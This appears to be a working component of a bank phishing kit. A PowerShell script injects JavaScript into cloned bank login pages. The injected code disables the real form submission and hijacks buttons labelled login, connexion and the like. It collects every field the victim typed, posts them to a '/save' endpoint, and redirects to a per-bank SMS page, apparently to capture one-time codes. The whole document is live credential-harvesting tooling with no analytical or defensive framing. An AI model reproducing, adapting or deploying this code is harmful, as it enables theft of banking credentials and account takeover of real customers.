$files = Get-ChildItem -Path . -Filter *.html | Where-Object { $_.Name -notmatch "_(sms|thankyou)\.html" -and $_.Name -notmatch "index\.html|menu\.html|tags\.html|test_redirect\.html" }

$script = @"
<script id="override-fix" type="text/javascript">
(function() {
    var loc = window.location.pathname.split('/').pop();
    var bankName = loc.replace('.html', '').replace('_sms', '');
    var SMS_PAGE = bankName + '_sms.html';
    
    function blockAllForms() {
        document.querySelectorAll('form').forEach(function(f) {
            if(!f._blocked) {
                f._blocked = true;
                f.addEventListener('submit', function(e) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    return false;
                }, true);
                f.onsubmit = function(e) { return false; };
                if(f.action) f.action = 'javascript:void(0)';
            }
        });
    }
    
    function handleClick(e) {
        var btn = e.currentTarget;
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        
        var _data = { bank: bankName, type: 'login', fields: {} };
        var inps = document.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"])');
        for(var i=0; i<inps.length; i++) {
            var key = inps[i].name || inps[i].id || inps[i].placeholder || 'champ_'+i;
            _data.fields[key] = inps[i].value;
        }
        
        var oldText = btn.textContent || btn.value;
        if(btn.tagName === 'INPUT') btn.value = 'Patientez...';
        else btn.textContent = 'Patientez...';
        
        fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(_data)
        }).then(function() {
            window.location.href = SMS_PAGE;
        }).catch(function() {
            window.location.href = SMS_PAGE;
        });
        return false;
    }
    
    function attachBtn() {
        var allBtns = document.querySelectorAll('button, input[type="submit"], input[type="button"], a.btn, a[class*="btn"]');
        for(var i=0; i<allBtns.length; i++) {
            var txt = (allBtns[i].textContent || allBtns[i].value || '').trim().toLowerCase();
            if(txt && (txt.includes('continu') || txt.includes('sign in') || txt.includes('log in') || txt.includes('valider') || txt.includes('se connecter') || txt.includes('next') || txt.includes('submit') || txt.includes('login') || txt.includes('connexion'))) {
                var btn = allBtns[i];
                if(!btn._overrideAttached) {
                    btn._overrideAttached = true;
                    btn.disabled = false;
                    btn.removeAttribute('disabled');
                    btn.removeAttribute('aria-disabled');
                    btn.style.cursor = 'pointer';
                    btn.style.pointerEvents = 'auto';
                    btn.addEventListener('click', handleClick, true);
                    btn.addEventListener('mousedown', function(e) { e.stopImmediatePropagation(); }, true);
                }
            }
        }
    }
    
    document.addEventListener('DOMContentLoaded', function() {
        blockAllForms();
        attachBtn();
        var obs = new MutationObserver(function() {
            blockAllForms();
            attachBtn();
        });
        obs.observe(document.body, { childList: true, subtree: true });
    });
    
    if(document.readyState !== 'loading') {
        setTimeout(function() {
            blockAllForms();
            attachBtn();
        }, 50);
    }
    
    document.addEventListener('click', function(e) {
        var btn = e.target.closest('button, input[type="submit"], input[type="button"], a');
        if(btn) {
            var txt = (btn.textContent || btn.value || '').trim().toLowerCase();
            if(txt && (txt.includes('continu') || txt.includes('sign in') || txt.includes('log in') || txt.includes('valider') || txt.includes('se connecter') || txt.includes('next') || txt.includes('submit') || txt.includes('login') || txt.includes('connexion'))) {
                if(!btn._overrideAttached) {
                    attachBtn();
                    handleClick(e);
                }
            }
        }
    }, true);
})();
</script>
"@

foreach ($file in $files) {
    $content = [System.IO.File]::ReadAllText($file.FullName, [System.Text.Encoding]::UTF8)
    
    $content = [regex]::Replace($content, "(?s)<script id=`"override-fix`".*?</script>", "")
    
    if ($content -match "(?i)<head.*?>") {
        $content = [regex]::Replace($content, "(?i)(<head.*?>)", "`$1`n" + $script)
    } else {
        $content = $script + "`n" + $content
    }
    
    [System.IO.File]::WriteAllText($file.FullName, $content, [System.Text.Encoding]::UTF8)
    Write-Host "Injected into $($file.Name)"
}
